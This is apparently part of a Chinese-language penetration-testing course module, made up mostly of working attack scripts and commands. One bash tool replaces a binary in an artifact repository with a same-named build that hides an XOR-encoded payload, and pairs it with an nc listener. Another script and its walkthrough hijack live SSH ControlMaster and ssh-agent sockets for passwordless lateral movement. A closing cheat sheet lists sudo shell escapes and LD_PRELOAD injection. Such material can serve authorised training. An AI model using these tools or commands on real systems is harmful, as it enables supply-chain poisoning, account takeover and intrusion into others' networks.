# 占位符：URL=制品地址；USER/PASS=制品库凭据；PAYLOAD=本地载荷文件；LHOST/LPORT 只出现在载荷内部
# 测试状态：已通过 bash -n 语法校验；未对真实制品库实测
set -uo pipefail

SELF="$(basename "$0")"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOADER_SRC="$SCRIPT_DIR/../c/m13-simple-loader.c"
ENCODER_SRC="$SCRIPT_DIR/../python/m13-xor-encoder.py"

WORK="./m13-artifactory-work"
KEY="0xfa"
PAYLOAD=""
ARCH="auto"
OUT=""
AUSER=""
APASS=""
CMD=""
URL_ARG=""
FILE_ARG=""

usage() {
  cat <<EOF
用法: $SELF <命令> [参数] [选项]

命令:
  info    <URL|本地文件>     查看制品类型、架构（elf32/elf64）、机器类型与校验和
  pull    <URL>              下载原制品到工作目录，自动备份为 <文件>.bak 并记录原校验和
  build   <本地原制品>        生成"同架构 + 同文件名"的替换制品（默认内嵌载荷，单文件投放）
  push    <URL> <本地文件>     上传覆盖远端制品
  verify  <URL> <本地文件>     重新下载远端制品并与本地比对 sha256
  restore <URL> <本地备份>     把 .bak 原制品传回，恢复现场

选项:
  -p, --payload <文件>  要内嵌的载荷（会被 XOR 编码后编进替换制品；不填则生成"读取同名 .enc"版）
  -k, --key <0xNN>      XOR key（默认 ${KEY}，须与载荷端一致）
  -a, --arch <auto|32|64>  替换制品架构，默认按原制品自动判定
  -w, --work <目录>     工作目录（默认 ${WORK}）
  -o, --out <文件>      pull/build 的输出文件名
      --user <USER>     制品库账号（占位符 USER）
      --pass <PASS>     制品库口令或 API key（占位符 PASS）
  -h, --help            显示本帮助

示例:
  $SELF pull http://TARGET:8082/artifactory/generic-local/agent.bin
  $SELF build ./agent.bin -p ./stage2.bin -k 0xfa
  $SELF push http://TARGET:8082/artifactory/generic-local/agent.bin ./m13-artifactory-work/agent.bin --user USER --pass PASS
EOF
}

die() { printf '[!] %s\n' "$*" >&2; exit 2; }
info() { printf '[*] %s\n' "$*"; }
hit() { printf '[+] %s\n' "$*"; }
need() { command -v "$1" >/dev/null 2>&1 || die "缺少命令: $1（请先安装或换一台有该工具的机器）"; }

sha_of() {
  if command -v sha256sum >/dev/null 2>&1; then sha256sum "$1" | awk '{print $1}';
  elif command -v shasum >/dev/null 2>&1; then shasum -a 256 "$1" | awk '{print $1}';
  else die "缺少 sha256sum/shasum，无法计算校验和"; fi
}

# 判定 ELF 位数：输出 32 / 64 / 空（非 ELF）
elf_class() {
  local f="$1"
  if command -v readelf >/dev/null 2>&1; then
    readelf -h "$f" 2>/dev/null | awk -F: '/Class:/{ v=$2; gsub(/[^A-Za-z0-9]/,"",v); if (v ~ /ELF32/) print 32; else if (v ~ /ELF64/) print 64; }'
  elif command -v file >/dev/null 2>&1; then
    if file -L "$f" 2>/dev/null | grep -q 'ELF 32-bit'; then echo 32;
    elif file -L "$f" 2>/dev/null | grep -q 'ELF 64-bit'; then echo 64; fi
  else
    info "既没有 readelf 也没有 file，跳过架构判定"
  fi
}

curl_auth() {
  if [ -n "$AUSER" ]; then printf -- '--user\n%s\n' "$AUSER:$APASS"; fi
}

do_info() {
  local f="$1"
  [ -n "$f" ] || die "info 需要 <URL|本地文件>"
  if [ -f "$f" ]; then
    local tmp="$f"
  else
    need curl
    tmp="$(mktemp)"
    curl -sS $(curl_auth) -o "$tmp" "$f" || die "下载失败: $f"
  fi
  hit "制品: $f"
  printf '  大小: %s 字节\n' "$(wc -c <"$tmp" | tr -d ' ')"
  printf '  sha256: %s\n' "$(sha_of "$tmp")"
  if command -v file >/dev/null 2>&1; then printf '  类型: %s\n' "$(file -Lb "$tmp")"; fi
  if command -v readelf >/dev/null 2>&1; then
    readelf -h "$tmp" 2>/dev/null | grep -E 'Class:|Machine:|Type:' | sed 's/^/  /' || true
  fi
  local cls
  cls="$(elf_class "$tmp")"
  if [ -n "$cls" ]; then hit "架构判定: elf${cls}（替换制品必须一致，否则下游执行失败）"; fi
  [ "$tmp" = "$f" ] || rm -f "$tmp"
}

do_pull() {
  need curl
  [ -n "$URL_ARG" ] || die "pull 需要 <URL>"
  mkdir -p "$WORK"
  local out="${OUT:-$WORK/$(basename "$URL_ARG")}"
  info "下载原制品: $URL_ARG"
  local code
  code="$(curl -sS $(curl_auth) -o "$out" -w '%{http_code}' "$URL_ARG")" || die "下载失败（检查 URL / 凭据 / 出网）: $URL_ARG"
  [ "$code" = "200" ] || die "下载返回 HTTP ${code}（期望 200）: $URL_ARG"
  cp -p "$out" "$out.bak"
  sha_of "$out" > "$out.sha256"
  hit "已保存: ${out}（备份 ${out}.bak，原校验和 ${out}.sha256）"
  do_info "$out"
  cat <<EOF

[*] 下游确认清单（先搞清楚"谁、什么时候、下载什么"，再决定替换口径）：
    1. 下游拉取方式：crontab -l / systemctl list-timers / 部署脚本里的 curl|wget 行
    2. 文件名与版本后缀必须逐字符一致（含大小写、架构后缀）
    3. 是否校验 sha256/GPG 签名——校验存在时替换会被发现，改走"替换其次级依赖"或"改配置指向"
    4. 业务行为：替换物要能正常启动并输出预期内容，优先"先跑原逻辑再加载载荷"
EOF
}

do_build() {
  need gcc
  [ -n "$FILE_ARG" ] || die "build 需要 <本地原制品>"
  [ -f "$FILE_ARG" ] || die "找不到原制品: $FILE_ARG"
  [ -f "$LOADER_SRC" ] || die "找不到加载器源码: $LOADER_SRC"

  local base cls march extra
  base="$(basename "$FILE_ARG")"
  cls="$(elf_class "$FILE_ARG")"
  case "$ARCH" in
    auto) [ -n "$cls" ] || info "原制品架构无法判定，按本机默认架构编译（下游若是 32 位请用 -a 32）"; march="" ;;
    32)   march="-m32" ;;
    64)   march="-m64" ;;
    *)    die "-a 只接受 auto|32|64" ;;
  esac
  if [ "$ARCH" = "auto" ] && [ -n "$cls" ]; then march="-m${cls}"; fi

  mkdir -p "$WORK"
  local src="$WORK/$base.c"
  local bin="${OUT:-$WORK/$base}"

  if [ -n "$PAYLOAD" ]; then
    need python3
    [ -f "$PAYLOAD" ] || die "找不到载荷文件: $PAYLOAD"
    [ -f "$ENCODER_SRC" ] || die "找不到编码脚本: $ENCODER_SRC"
    python3 "$ENCODER_SRC" -i "$PAYLOAD" -k "$KEY" --c-array 2>/dev/null | grep -v '^\[' > "$WORK/array.c"
    [ -s "$WORK/array.c" ] || die "编码失败：检查 -p 载荷与 -k key"
    awk -v arrfile="$WORK/array.c" '
      /EMBED_BEGIN/ {print; while ((getline line < arrfile) > 0) print line; skip=1; next}
      /EMBED_END/   {skip=0}
      skip==0       {print}
    ' "$LOADER_SRC" > "$src"
    extra="-DEMBED_PAYLOAD"
    hit "载荷已编码内嵌（磁盘上不含明文 payload）"
  else
    cp "$LOADER_SRC" "$src"
    extra=""
    info "未指定 -p：生成外部文件版，需要在下游同目录放 ${base}.enc（否则替换物启动即退出）"
  fi

  local -a cargs=()
  [ -n "$march" ] && cargs+=("$march")
  [ -n "$extra" ] && cargs+=("$extra")
  cargs+=(-Wall -O2 -s -o "$bin" "$src")
  info "编译: gcc ${cargs[*]}"
  gcc "${cargs[@]}" || die "编译失败（32 位目标需要 gcc multilib：apt install gcc-multilib）"

  local new_cls
  new_cls="$(elf_class "$bin")"
  if [ -n "$cls" ] && [ -n "$new_cls" ] && [ "$new_cls" != "$cls" ]; then
    die "架构不一致：原制品 elf${cls}，替换制品 elf${new_cls}（下游会执行失败，请用 -a 指定并确认 multilib）"
  fi
  hit "替换制品: ${bin}（架构校验通过: elf${new_cls:-未知}）"
  printf '  sha256: %s\n' "$(sha_of "$bin")"
  sha_of "$bin" > "$bin.sha256"
  cat <<EOF

[*] 下一步：
    1. 起监听：nc -lvnp LPORT
    2. 上传覆盖：$SELF push <URL> $bin --user USER --pass PASS
    3. 比对确认：$SELF verify <URL> $bin
    4. 等下游按周期拉取；验证完记得：$SELF restore <URL> ${FILE_ARG}.bak
EOF
}

do_push() {
  need curl
  [ -n "$URL_ARG" ] && [ -n "$FILE_ARG" ] || die "push 需要 <URL> <本地文件>"
  [ -f "$FILE_ARG" ] || die "找不到本地文件: $FILE_ARG"
  local -a cargs=(-sS -o /dev/null -w '%{http_code}')
  if [ -n "$AUSER" ]; then cargs+=(--user "$AUSER:$APASS"); fi
  cargs+=(-T "$FILE_ARG" "$URL_ARG")
  local code
  code="$(curl "${cargs[@]}")" || die "上传失败（检查 URL / 凭据 / 仓库写权限）: $URL_ARG"
  hit "上传返回 HTTP ${code}（201/200 视为成功）"
  [ "$code" = "201" ] || [ "$code" = "200" ] || [ "$code" = "204" ] || die "上传未成功，HTTP $code"
  info "若仓库有 CDN/缓存，下游可能仍拿到旧制品——必要时刷新缓存或换一个版本号路径"
}

do_verify() {
  need curl
  [ -n "$URL_ARG" ] && [ -n "$FILE_ARG" ] || die "verify 需要 <URL> <本地文件>"
  [ -f "$FILE_ARG" ] || die "找不到本地文件: $FILE_ARG"
  local tmp lsum rsum
  tmp="$(mktemp)"
  curl -sS $(curl_auth) -o "$tmp" "$URL_ARG" || die "重新下载失败: $URL_ARG"
  lsum="$(sha_of "$FILE_ARG")"
  rsum="$(sha_of "$tmp")"
  rm -f "$tmp"
  printf '  本地: %s\n' "$lsum"
  printf '  远端: %s\n' "$rsum"
  if [ "$lsum" = "$rsum" ]; then
    hit "校验和一致：远端已是我们的替换制品"
  else
    die "校验和不一致：可能被缓存/权限/路径问题挡住（换版本路径、刷新缓存或确认仓库是否重写元数据）"
  fi
}

do_restore() {
  need curl
  [ -n "$URL_ARG" ] && [ -n "$FILE_ARG" ] || die "restore 需要 <URL> <本地备份(.bak)>"
  [ -f "$FILE_ARG" ] || die "找不到备份文件: ${FILE_ARG}（pull 时自动生成 <文件>.bak）"
  local -a cargs=(-sS -o /dev/null -w '%{http_code}')
  if [ -n "$AUSER" ]; then cargs+=(--user "$AUSER:$APASS"); fi
  cargs+=(-T "$FILE_ARG" "$URL_ARG")
  local code
  code="$(curl "${cargs[@]}")" || die "恢复上传失败: $URL_ARG"
  hit "恢复上传返回 HTTP ${code}；请与 ${FILE_ARG}.sha256 记录的原始校验和再比对一次"
}

# ---- 参数解析 ----
[ $# -gt 0 ] || { usage; exit 2; }
CMD="$1"; shift
case "$CMD" in
  -h|--help) usage; exit 0 ;;
  info|pull|build|push|verify|restore) ;;
  *) usage; die "未知命令: $CMD" ;;
esac

while [ $# -gt 0 ]; do
  case "$1" in
    -h|--help)    usage; exit 0 ;;
    -p|--payload) [ $# -ge 2 ] || die "-p 需要参数：载荷文件"; PAYLOAD="$2"; shift 2 ;;
    -k|--key)     [ $# -ge 2 ] || die "-k 需要参数：XOR key"; KEY="$2"; shift 2 ;;
    -a|--arch)    [ $# -ge 2 ] || die "-a 需要参数：auto|32|64"; ARCH="$2"; shift 2 ;;
    -w|--work)    [ $# -ge 2 ] || die "-w 需要参数：工作目录"; WORK="$2"; shift 2 ;;
    -o|--out)     [ $# -ge 2 ] || die "-o 需要参数：输出文件"; OUT="$2"; shift 2 ;;
    --user)       [ $# -ge 2 ] || die "--user 需要参数：账号"; AUSER="$2"; shift 2 ;;
    --pass)       [ $# -ge 2 ] || die "--pass 需要参数：口令/API key"; APASS="$2"; shift 2 ;;
    -*)           usage; die "未知选项: $1" ;;
    *)
      if [ -z "$URL_ARG" ]; then URL_ARG="$1";
      elif [ -z "$FILE_ARG" ]; then FILE_ARG="$1";
      else die "多余的位置参数: $1"; fi
      shift ;;
  esac
done

case "$CMD" in
  info)    do_info "${URL_ARG}" ;;
  pull)    do_pull ;;
  build)   FILE_ARG="${FILE_ARG:-$URL_ARG}"; do_build ;;
  push)    do_push ;;
  verify)  do_verify ;;
  restore) do_restore ;;
esac
````

## 场景 48 · 没有 SSH 密码，但存在已认证的复用连接

### 场景回顾
我们已经拿到一台 Linux 主机上某用户的 shell（例如 web 服务用户或通过前面场景获得），但**不知道其它用户/内网主机的 SSH 密码**，也没有现成私钥。然而目标环境里存在**已认证的 SSH 复用连接**：一是 `ControlMaster`（多路复用）留下的 socket，二是被转发进来的 `ssh-agent`。利用它们可以“借用”已有认证上下文直接登入其它主机，**全程不需要密码/私钥文件**。

### 前提与假设
- 我们以**拥有该主连接/agent 的用户身份**运行（通常场景把我们放在该用户下；跨用户需要 root）。
- ControlMaster：用户 `~/.ssh/config` 配置了 `ControlMaster auto` + `ControlPath` + `ControlPersist`，或当前存在活动主连接（socket 文件，如 `/home/USER/.ssh/controlmaster/USER@host:22`）。
- Agent：主连接使用了 `ForwardAgent yes` 或本地 `ssh-agent` 里已加载密钥；agent socket（`/tmp/ssh-XXXX/agent.NNNN`）对我们可读。
- 目标主机允许该用户经这些复用通道访问（正是场景想证明的横向面）。

### 准备（攻击机侧）
1. 枚举可复用资产：
   - ControlMaster socket：`find ~/.ssh -name 'control*' -o -path '*controlmaster*' 2>/dev/null`、`ls -la ~/.ssh/`、`ps aux | grep 'ssh -M'`、`lsof -U 2>/dev/null | grep -i control`（同用户可见）。
   - Agent：`ls /tmp/ssh-*/agent.* 2>/dev/null`、`echo $SSH_AUTH_SOCK`、`ssh-add -l`。
2. 若 config 没有 ControlMaster 但我们有该用户家目录写权限且其正有活动连接：可以注入 `~/.ssh/config` 让后续连接复用（`ControlMaster auto; ControlPath ~/.ssh/controlmaster/%r@%h:%p; ControlPersist 10m`），见 cheat sheet。
3. 本地/目标上准备用于确认身份的命令（`id`、`hostname`）。

### 执行步骤
1. **ControlMaster 复用**：找到 socket（例如 `/home/USER/.ssh/controlmaster/USER@TARGET:22`）后直接借道执行，无需密码：
   - `ssh -S /home/USER/.ssh/controlmaster/USER@TARGET:22 USER@TARGET 'id && hostname'`
   - 也可交互 `ssh -S <socket> USER@TARGET`。
   - socket 命名规则要核对（config 里的 `%h:%p` 展开）；先用 `ls` 看实际文件名。
2. **Agent 转发借用**：若我们的会话带转发 agent（`$SSH_AUTH_SOCK` 指向可读 agent），先 `ssh-add -l` 看有哪些身份；然后直接以对应用户名登录其可达主机：
   - `ssh -o StrictHostKeyChecking=no USER@TARGET 'id'`（agent 自动完成签名，不落地私钥）。
3. **发现其它 agent socket**（同用户其它会话/进程）：把 `SSH_AUTH_SOCK` 指向它后重复上一步：
   - `SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.NNNN ssh-add -l`
4. 在登入的目标上继续枚举/横向；**不提取私钥文件**（有 agent 就不需要，提取反而危险且可能失败——agent 里常是加密密钥）。

### 用到的脚本
- `m13-ssh-controlmaster-hijack.sh`：自动发现 ControlMaster socket 与可用 agent socket，逐一尝试复用登入，输出成功的目标与身份。

### 验证
- 复用命令返回目标主机身份：`id`/`hostname` 与主连接用户一致且无需密码。
- agent 借用能登入 `ssh-add -l` 所列身份对应的主机。
- 全过程无密码提示、无“Permission denied (publickey)”报错。

### 失败分支与备选
1. **socket 是 stale（连接已断/ControlPersist 过期）**：`ssh -S socket ...` 报 `Control socket connect() failed` → 别硬试，找还在活动的主连接（`ps aux | grep 'ssh '` 看有交互的主进程），或换 agent 线。
2. **agent 里的身份登不上目标**（该用户对目标无权限，或目标不在 agent 身份可达范围）：用 `ssh-add -l` 逐条核对，试其它用户名/主机；若目标主机名未知，先在其可达列表里探测。
3. **ControlMaster socket 名与 `%h:%p` 展开不一致**：直接按 `ls ~/.ssh/controlmaster/` 的实际文件名构造 `-S` 参数。
4. **我们不是主连接的用户（跨用户）**：无 root 则读不了别人 socket/agent（socket 权限 0700）→ 这不是本场景入口，回退找同一用户下的连接或先提权。
5. **目标不接受复用通道连入（配置 `ControlMaster` 只在单向）**：退而用 agent 转发；两者都不可用且无凭据时，该横向路径不成立，明确记录而不是硬撞。

### 考试注意 / OPSEC
- 复用连接比偷私钥干净：**不要**尝试 `scp` 出 `id_rsa` 或用 `ssh-keygen` 破解 agent（有 agent 就直接用）。
- `ssh -S` 与 agent 借用都会在目标留下 auth 日志（`Accepted publickey for ...` 来自复用/agent），属正常登录形态；避免在目标上跑大流量扫描刷日志。
- 不要 kill 别人的主连接/agent 进程（会断掉环境里其它依赖，且暴露）。
- 结束会话时正常 `exit`，让复用 socket 按 `ControlPersist` 自然过期。

---

#### `m13-ssh-controlmaster-hijack.sh`

````bash
#!/usr/bin/env bash
# 用途：复用目标上"已认证"的 SSH 上下文横向到下一跳——
#       ① 发现并复用 ControlMaster 多路复用套接字（ssh -S socket，无需密码、无需私钥文件）；
#       ② 借用可读的 ssh-agent（SSH_AUTH_SOCK）用其已加载的身份登录下一跳；
#       全程不接触、不复制、不回传任何私钥文件内容（有 agent 就直接用，取私钥反而更脏且常是加密的）。
# 场景：48（没有 SSH 密码，但存在已认证的复用连接）
# 依赖：openssh-client（ssh、ssh-add）；在**已控制的 Linux 用户环境**里执行（socket 属主通常是该用户）
# 使用：
#   bash m13-ssh-controlmaster-hijack.sh                                   # 发现套接字与 agent，逐个 check
#   bash m13-ssh-controlmaster-hijack.sh check  -s /home/USER/.ssh/controlmaster/USER@TARGET:22
#   bash m13-ssh-controlmaster-hijack.sh exec   -s <socket> -d USER@TARGET -c 'id; hostname'
#   bash m13-ssh-controlmaster-hijack.sh shell  -s <socket> -d USER@TARGET
#   bash m13-ssh-controlmaster-hijack.sh agent  -d USER@TARGET [-a /tmp/ssh-XXXX/agent.NNNN]
#   bash m13-ssh-controlmaster-hijack.sh forward -s <socket> -d USER@TARGET -L LPORT:TARGET:PORT
#   bash m13-ssh-controlmaster-hijack.sh prepare [--write]                 # 生成/写入 ControlMaster 配置
#   bash m13-ssh-controlmaster-hijack.sh -h
# 占位符：USER=目标用户名；TARGET=下一跳主机；LHOST/LPORT=回连地址（到达下一跳后投递载荷时用）
# 测试状态：已通过 bash -n 语法校验；未在真实环境实测
set -uo pipefail

SELF="$(basename "$0")"
CMD=""
SOCK=""
DEST=""
REMOTE_CMD='id; hostname; uname -a'
AGENT="${SSH_AUTH_SOCK:-}"
FSPEC=""
DO_WRITE=0

usage() {
  cat <<EOF
用法: $SELF <命令> [选项]

命令:
  discover (默认)                发现 ControlMaster 套接字与 agent 套接字，并逐个 ssh -O check
  check    -s <socket>           检查指定 ControlMaster 套接字是否仍然有效
  exec     -s <socket> -d <USER@TARGET> [-c '<命令>']   复用已认证连接执行远程命令
  shell    -s <socket> -d <USER@TARGET>                 复用已认证连接开交互 shell
  agent    -d <USER@TARGET> [-a <agent socket>]         借用 ssh-agent 里的身份登录下一跳
  forward  -s <socket> -d <USER@TARGET> -L <LPORT:TARGET:PORT>   在复用连接上加本地端口转发
  prepare  [--write]             打印（或备份后写入 ~/.ssh/config）ControlMaster 配置片段

选项:
  -s, --socket <路径>   ControlMaster 套接字路径
  -d, --dest <USER@TARGET>   下一跳目标
  -c, --cmd '<命令>'     远程执行的命令（默认: ${REMOTE_CMD}）
  -a, --agent <路径>     agent 套接字路径（默认取当前 SSH_AUTH_SOCK）
  -L, --forward <LPORT:TARGET:PORT>   本地端口转发规格
      --write            prepare 时把配置写入 ~/.ssh/config（先备份）
  -h, --help            显示本帮助

示例:
  $SELF discover
  $SELF exec -s /home/USER/.ssh/controlmaster/USER@TARGET:22 -d USER@TARGET -c 'id'
  $SELF agent -d USER@TARGET -a /tmp/ssh-XXXX/agent.NNNN
EOF
}

die() { printf '[!] %s\n' "$*" >&2; exit 2; }
info() { printf '[*] %s\n' "$*"; }
hit() { printf '[+] %s\n' "$*"; }

need_ssh() { command -v ssh >/dev/null 2>&1 || die "缺少 ssh 客户端"; }

# 从 ~/.ssh/config 里读 ControlPath（可能带 %h/%p/%r 占位，需人工展开核对）
show_config() {
  local cfg="${HOME:-/root}/.ssh/config"
  if [ -f "$cfg" ]; then
    info "~/.ssh/config 中的复用相关配置："
    grep -nEi 'ControlMaster|ControlPath|ControlPersist|ForwardAgent' "$cfg" 2>/dev/null | sed 's/^/    /' || true
  else
    info "没有 ~/.ssh/config（${cfg}）"
  fi
}

do_discover() {
  need_ssh
  info "枚举 ControlMaster 套接字（当前用户可见）"
  show_config
  local found=0 s
  while IFS= read -r s; do
    [ -n "$s" ] || continue
    case "$(basename "$s")" in
      agent.*) continue ;;   # agent 单独处理
    esac
    found=1
    printf '\n[+] 候选套接字: %s\n' "$s"
    ssh -O check -S "$s" 2>&1 | sed 's/^/    /'
    printf '    复用执行: ssh -S %s <USER@TARGET> "id"\n' "$s"
  done < <(find "${HOME:-/root}/.ssh" /tmp -maxdepth 4 -type s 2>/dev/null \
             | grep -Ei 'control|master|cm_|cm-|sock' | sort -u)

  if [ "$found" -eq 0 ]; then
    printf '\n'
    info "未发现明显命名的 ControlMaster 套接字；列出 /tmp 与 ~/.ssh 下所有 socket 供人工判断："
    find "${HOME:-/root}/.ssh" /tmp -maxdepth 4 -type s 2>/dev/null | sed 's/^/    /'
  fi

  printf '\n'
  info "枚举 agent 套接字（SSH_AUTH_SOCK=${SSH_AUTH_SOCK:-未设置}）"
  local a any=0
  for a in /tmp/ssh-*/agent.*; do
    [ -S "$a" ] || continue
    any=1
    printf '\n[+] agent: %s\n' "$a"
    SSH_AUTH_SOCK="$a" ssh-add -l 2>&1 | sed 's/^/    /'
    printf '    借用: SSH_AUTH_SOCK=%s ssh <USER@TARGET> "id"\n' "$a"
  done
  if [ "$any" -eq 0 ]; then
    info "未发现 /tmp/ssh-*/agent.*；若当前会话带转发 agent，直接用: ssh-add -l"
    ssh-add -l 2>&1 | sed 's/^/    /'
  fi

  cat <<'EOF'

[*] 复用连接的两个前提（不满足就不是本场景入口）：
    1. 我们以主连接属主身份运行（跨用户需要 root，socket 权限通常 0700）
    2. 目标主机允许该用户/该身份连入（正是场景想证明的横向面）
[*] 不要 kill 别人的主连接或 agent 进程——会断掉环境里其它依赖，也暴露自己
EOF
}

do_check() {
  need_ssh
  [ -n "$SOCK" ] || die "check 需要 -s <socket>"
  [ -S "$SOCK" ] || die "不是套接字或不存在: ${SOCK}（stale socket 会报 Control socket connect() failed）"
  info "检查: $SOCK"
  ssh -O check -S "$SOCK" 2>&1 | sed 's/^/    /'
}

do_exec() {
  need_ssh
  [ -n "$SOCK" ] || die "exec 需要 -s <socket>"
  [ -S "$SOCK" ] || die "不是套接字或不存在: ${SOCK}（stale socket 会报 Control socket connect() failed）"
  [ -n "$DEST" ] || die "exec 需要 -d <USER@TARGET>"
  info "复用 $SOCK  ->  $DEST  执行: $REMOTE_CMD"
  ssh -S "$SOCK" -o StrictHostKeyChecking=no "$DEST" "$REMOTE_CMD" 2>&1 | sed 's/^/    /'
}

do_shell() {
  need_ssh
  [ -n "$SOCK" ] || die "shell 需要 -s <socket>"
  [ -S "$SOCK" ] || die "不是套接字或不存在: ${SOCK}"
  [ -n "$DEST" ] || die "shell 需要 -d <USER@TARGET>"
  info "开交互 shell（退出用 exit，让 ControlPersist 自然过期）: ssh -S $SOCK $DEST"
  ssh -S "$SOCK" -o StrictHostKeyChecking=no -t "$DEST"
}

do_agent() {
  need_ssh
  [ -n "$DEST" ] || die "agent 需要 -d <USER@TARGET>"
  if [ -z "$AGENT" ]; then
    info "未指定 -a，使用当前环境的 SSH_AUTH_SOCK=${SSH_AUTH_SOCK:-未设置}"
  fi
  info "列出 agent 中可用的身份："
  if [ -n "$AGENT" ]; then
    SSH_AUTH_SOCK="$AGENT" ssh-add -l 2>&1 | sed 's/^/    /'
  else
    ssh-add -l 2>&1 | sed 's/^/    /'
  fi
  info "用这些身份登录 ${DEST}（BatchMode 免交互，签名由 agent 完成，私钥不落地）："
  if [ -n "$AGENT" ]; then
    SSH_AUTH_SOCK="$AGENT" ssh -o BatchMode=yes -o StrictHostKeyChecking=no "$DEST" "$REMOTE_CMD" 2>&1 | sed 's/^/    /'
  else
    ssh -o BatchMode=yes -o StrictHostKeyChecking=no "$DEST" "$REMOTE_CMD" 2>&1 | sed 's/^/    /'
  fi
}

do_forward() {
  need_ssh
  [ -n "$SOCK" ] || die "forward 需要 -s <socket>"
  [ -S "$SOCK" ] || die "不是套接字或不存在: ${SOCK}"
  [ -n "$DEST" ] || die "forward 需要 -d <USER@TARGET>"
  [ -n "$FSPEC" ] || die "forward 需要 -L <LPORT:TARGET:PORT>"
  info "在复用连接上加本地转发: -L $FSPEC"
  ssh -S "$SOCK" -O forward -L "$FSPEC" "$DEST" 2>&1 | sed 's/^/    /'
  info "查看已建立的转发：ssh -S $SOCK -O forward -L $FSPEC $DEST ; ss -lntp 2>/dev/null | grep ${FSPEC%%:*}"
}

do_prepare() {
  local cfg="${HOME:-/root}/.ssh/config"
  local block='# --- m13: ControlMaster 复用（让后续连接复用已认证的主连接） ---
Host *
    ControlMaster auto
    ControlPath ~/.ssh/controlmaster/%r@%h:%p
    ControlPersist 10m'
  if [ "$DO_WRITE" -eq 1 ]; then
    [ -d "${HOME:-/root}/.ssh" ] || die "家目录没有 .ssh，无法写入"
    mkdir -p "${HOME:-/root}/.ssh/controlmaster"
    chmod 700 "${HOME:-/root}/.ssh/controlmaster"
    [ -f "$cfg" ] && cp -p "$cfg" "$cfg.m13.bak" && info "已备份原配置: $cfg.m13.bak"
    printf '\n%s\n' "$block" >> "$cfg"
    hit "已追加到 ${cfg}（改的是自己的家目录；改动前已备份）"
  else
    info "建议写入 ~/.ssh/config 的片段（加 --write 才会真的写入）："
    printf '%s\n' "$block"
  fi
  info "写入后：后续同用户发起的 ssh 会自动复用主连接，socket 落在 ~/.ssh/controlmaster/"
}

[ $# -gt 0 ] || { do_discover; exit 0; }
CMD="$1"; shift
case "$CMD" in
  -h|--help) usage; exit 0 ;;
  discover|check|exec|shell|agent|forward|prepare) ;;
  *) usage; die "未知命令: $CMD" ;;
esac

while [ $# -gt 0 ]; do
  case "$1" in
    -h|--help)    usage; exit 0 ;;
    -s|--socket)  [ $# -ge 2 ] || die "-s 需要参数：套接字路径"; SOCK="$2"; shift 2 ;;
    -d|--dest)    [ $# -ge 2 ] || die "-d 需要参数：USER@TARGET"; DEST="$2"; shift 2 ;;
    -c|--cmd)     [ $# -ge 2 ] || die "-c 需要参数：远程命令"; REMOTE_CMD="$2"; shift 2 ;;
    -a|--agent)   [ $# -ge 2 ] || die "-a 需要参数：agent 套接字路径"; AGENT="$2"; shift 2 ;;
    -L|--forward) [ $# -ge 2 ] || die "-L 需要参数：LPORT:TARGET:PORT"; FSPEC="$2"; shift 2 ;;
    --write)      DO_WRITE=1; shift ;;
    *)            usage; die "未知选项: $1" ;;
  esac
done

case "$CMD" in
  discover) do_discover ;;
  check)    do_check ;;
  exec)     do_exec ;;
  shell)    do_shell ;;
  agent)    do_agent ;;
  forward)  do_forward ;;
  prepare)  do_prepare ;;
esac
````

## 通用速查（本模块命令集）

```bash
# 编码/加载
python3 m13-xor-encoder.py --key 0x41 -i stage2.bin -o stage2.enc       # 文件模式
python3 m13-xor-encoder.py --key 0x41 -i stage2.bin --c-array          # C 数组模式（内嵌用）
gcc -o loader m13-simple-loader.c                                     # 业务模式/内存解码模式由宏切换

# 共享库
gcc -Wall -fPIC -shared -o lib.so m13-shared-library-ldpreload.c -ldl
gcc -Wall -fPIC -shared -o libmissing.so.1.1 m13-shared-library-ldlibrarypath.c -ldl
LD_PRELOAD=/path/lib.so TARGET_BIN
LD_LIBRARY_PATH=/可控目录 ldd TARGET_BIN

# sudo 逃逸
sudo vim -c ':!/bin/sh'
sudo find . -exec /bin/sh \; -quit
sudo lua -e 'os.execute("/bin/sh")'

# SSH 复用
ssh -S /home/USER/.ssh/controlmaster/USER@TARGET:22 USER@TARGET 'id'
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.NNNN ssh-add -l
```

## 本模块脚本清单与场景对应
| 脚本 | 场景 | 用途 |
|---|---|---|
| `m13-xor-encoder.py` | 36/37 | XOR 编码/解码 payload（文件或 C 数组） |
| `m13-simple-loader.c` | 36/37 | 内存解码执行 stage2；业务输出/心跳模式 |
| `m13-shared-library-ldpreload.c` | 38 | LD_PRELOAD 注入 .so |
| `m13-shared-library-ldlibrarypath.c` | 38 | 同名替换缺失库（LD_LIBRARY_PATH） |
| `m13-sudo-gtfobins.sh` | 39 | sudo 放行单程序的 GTFOBins 逃逸 |
| `m13-artifactory-replace.sh` | 40 | 制品备份/替换/恢复 |
| `m13-ssh-controlmaster-hijack.sh` | 48 | ControlMaster/agent 复用连接发现与借用 |
